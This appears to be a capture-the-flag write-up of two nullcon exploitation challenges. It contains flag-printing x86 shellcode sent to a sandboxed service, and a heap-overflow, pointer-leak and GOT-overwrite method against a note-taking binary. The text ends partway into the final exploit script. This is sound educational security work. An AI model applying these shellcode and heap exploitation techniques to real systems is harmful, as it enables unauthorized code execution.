<p>Again, this was a one-two with superkojiman, who did the initial reversing! The program needs <code>libseccomp</code> to run. I had to install <code>libseccomp1</code> on my Ubuntu VM and symlink <code>libseccomp.so.2</code> to it to make the binary start. <a href="http://sourceforge.net/projects/libseccomp/">libseccomp</a> does syscall filtering. In this case, whatever is added to its internal list is ok, other syscalls are caught and the program exits with SIGSYS.</p>

<p>The syscalls that are whitelisted can be found by looking for <code>seccomp_rule_add</code> calls:</p>

<pre><code> 80488dc: c7 44 24 0c 00 00 00  mov    DWORD PTR [esp+0xc],0x0

</code></pre>

<p>So that&rsquo;s not a whole lot to work with. We can only read, write and exit. No <code>execve</code> or open/read/write for us!</p>

<h2>Diving deeper</h2>

<p>Luckily, when run, the binary does all the heavy lifting for us. It reads the flag and stores it on the heap. It then waits for input, storing that also on the heap and then proceeds to run whatever is entered:</p>

<pre><code>   0x80489d6 &lt;main+599&gt;:    call   0x80485a0 &lt;read@plt&gt;
   0x80489db &lt;main+604&gt;:    mov    eax,DWORD PTR [esp+0x2c]
   0x80489df &lt;main+608&gt;:    mov    DWORD PTR [esp+0x3c],eax
   0x80489e3 &lt;main+612&gt;:    mov    eax,DWORD PTR [esp+0x3c]
   0x80489e7 &lt;main+616&gt;:    call   eax
</code></pre>

<p>This allows us to supply our own shellcode without even having to exploit a vulnerability. There were some annoying things that prevented me from debugging the binary locally, so I hex-edited the binary to make the calls to <code>signal()</code> and <code>alarm()</code> do nothing (edit the <code>plt</code> section for those calls &amp; make the first byte <code>0xc3</code> -> <code>RET</code>).</p>

<p>I started binary via <code>socat</code> to test locally. First, let&rsquo;s see what we have to work with, by sending a single <code>0xcc</code> (<code>INT 3</code>) via a python script:</p>

<pre><code class="python">import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 5555))

raw_input()
s.send("\xcc")

print s.recv(256)
s.close()
</code></pre>

<p>The <code>raw_input()</code> serves to halt the binary, given us the chance to attach gdb with</p>

<pre><code class="bash">$ gdb -pid `pgrep sbox`
</code></pre>

<p>After attaching, I entered &lsquo;c&rsquo; to continue execution. Then the binary crashes upon hitting the <code>INT 3</code>. The registers look like this, flag is in the same mmapped region:</p>

<pre><code>0xb77c6002 in ?? ()
gdb-peda$ i r
eax            0xb77c6000    0xb77c6000

gdb-peda$ find "FLAG"
Searching for 'FLAG' in: None ranges
Found 2 results, display max 2 items:
    mapped : 0xb77c8000 ("FLAG\n")
</code></pre>

<p>I whipped up some &lsquo;shellcode&rsquo; (if you can call it that). We can use the values of the registers in our shellcode to write the flag to STDOUT. For instance, <code>ecx</code> already points to the shellcode. We just have to add <code>0x2000</code> to it to get the address of the flag!</p>

<pre><code>bits 32

push 0x20     # 
pop ebx       # pop 0x20 in ebx
shl ebx, 8    # ebx is now 0x2000
              # adjust ecx so that it points to flag in memory
add ecx, ebx  # ecx = buffer
xor ebx, ebx  # ebx = fd
inc ebx       # STDOUT; STDERR also works
xor edx, edx  # edx = count
mov dl, 0xff  # write out 255 bytes
push 4        # eax = syscall
pop eax       # eax = write
int 0x80      # get flag!
</code></pre>

<p>I avoided null-bytes, just in case. The shellcode was compiled with</p>

<pre><code class="bash">$ nasm -f bin ./shellcode.asm
</code></pre>

<p>I had issues with <code>radare2</code> not recognizing some opcodes (need to look into that!), which is why I switched to <code>nasm</code>. Using a modified version of the earlier python code, I sent the shellcode over to the server:</p>

<pre><code class="python">import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.163.248.69',9001))

with open('shellcode') as f:
    data = f.read()
    s.send(data)

print s.recv(256)
s.close()
</code></pre>

<p>The result:</p>

<pre><code class="bash">$ python sploit.py
d3sp3r4t3_sh3llc0d3
</code></pre>

<p>The flag was <code>d3sp3r4t3_sh3llc0d3</code>.</p>

<p></p>

<p>Again, superkojiman started with the invaluable initial reverse engineering. The application is a note-taking program:</p>

<pre><code>~/tmp/nullcon/exp400$ ./MentalNote 
You want to store some Notes??
Well, we present you the Sherlock's MentalPad --&gt;
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
</code></pre>

<p>superkojiman pointed out that there were two types of notes. Upon adding a note, the program asks for the type. It looks like the second type is larger. By editing a note as type two, we are able to overflow notes into the next note&rsquo;s meta-data.</p>

<p>First, let&rsquo;s allocate two notes and set them to something to inspect the heap layout.</p>

<p>I located the second note in the heap using gdb-peda&rsquo;s <code>find</code> command.</p>

<pre><code>gdb-peda$ x/60w 0x804d0c0
0x804d0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0d0:  0x00000000  0x00000000  0x00000000  0x00000000

0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>You can see that there are several pointers stored on the heap. It looks like a doubly-linked list, with pointers to the next and previous notes. The struct that describes this layout would look something like this:</p>

<pre><code class="c">struct note {
    note *next_note;
    note *prev_note;
    char note_content[MAX_LENGTH];
};
</code></pre>

<p>I sent a stupidly large input to overflow these notes:</p>

<p>The heap for note two now looks like this:</p>

<pre><code>gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x46464646  0x47474747  0x48484848  0x49494949

0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
</code></pre>

<p>We have overwritten the pointers. Furthermore, superkojiman noticed:</p>

<pre><code>gdb-peda$ vmmap
Start      End        Perm  Name
&lt;snip&gt;
0x0804c000 0x0804e000 rwxp  [heap]
</code></pre>

<p>The heap is writeable <strong>and</strong> executable. This allows us to store shellcode on the heap. Now to find a way to get the heap address reliably (ASLR is enabled) and overwrite a GOT pointer with the location of our shellcode.</p>

<p>I recently tested c0ne&rsquo;s binaries for his Pandora&rsquo;s Box VM. I did one of the challenges in a similar way: overflow a buffer up to a certain pointer to grab extra bytes when that buffer is printed. I could leak the heap address by sending just enough bytes into note one to make the heap look like this:</p>

<pre><code>gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0d0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0e0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0f0:  0x4242420a  0x0804d1d0  0x0804d010  0x42424242
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>When I know requested the value of note one, the binary would dump out lots of B&rsquo;s, but also append the pointers from the heap! With that sorted, I could find my shellcode on the heap even with ASLR enabled. Next was overwriting a GOT pointer. This was done by overflowing a note and overwriting the pointers to <code>next_note</code> and <code>prev_note</code>. Then I&rsquo;d ask the binary to delete a note. It does this by calling <code>free()</code>. Because we can control the two pointers, we have a write-what-where primitive. By setting the right values, I could write the address of the shellcode on the heap to <code>__isoc99_scanf@got.plt</code>. Initially, I swapped the two memory addresses around, leading to mangled shellcode. After overwriting the GOT pointer of <code>__isoc99_scanf@got.plt</code>, which is one of the next functions the binary calls in its main loop, the shellcode on the heap is executed. Because of the way <code>free()</code> works, we need to adjust the addresses a bit.</p>

<p>The <a href="http://www.shell-storm.org/shellcode/files/shellcode-547.php">shellcode</a> was modified a bit (&lsquo;/bin/ash&rsquo; -> &lsquo;/bin//sh&rsquo;) and stored on the heap. The overflow was used to overwrite the two pointers, and the write-what-where is triggered by sending a &lsquo;delete note&rsquo; command.</p>

<p>The exploit:</p>

<pre><code class="python">import struct
